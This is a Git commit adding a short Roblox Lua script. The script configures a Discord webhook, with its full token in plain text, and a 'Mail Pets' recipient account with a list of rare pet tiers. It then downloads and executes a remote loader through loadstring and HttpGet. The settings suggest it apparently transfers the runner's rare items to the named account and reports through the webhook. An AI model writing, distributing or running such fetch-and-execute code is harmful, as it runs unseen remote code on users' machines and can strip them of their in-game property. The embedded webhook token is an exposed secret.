c8236bfdd08b22ed573212381a2222aba306537a
kubi3r <98976190+kubi3r@users.noreply.github.com>
2024-10-25 14:54:58 +0300

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,8 @@
+getgenv().Settings = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1295035080166609086/jhY1oouLcdkzJpQ0R3uLgA87Fz0lCbgX1Ln2QjdfP1kz2JXal8NIEoRoxIgExr3rk3Sg",
+    ["Discord ID"] = "610422789408817163",
+    
+    ["Mail Pets"] = "kubi3r",
+    ["Rarities"] = {"Secret", "Exclusive", "Divine", "Exotic", "Celestial", "Superior"},
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
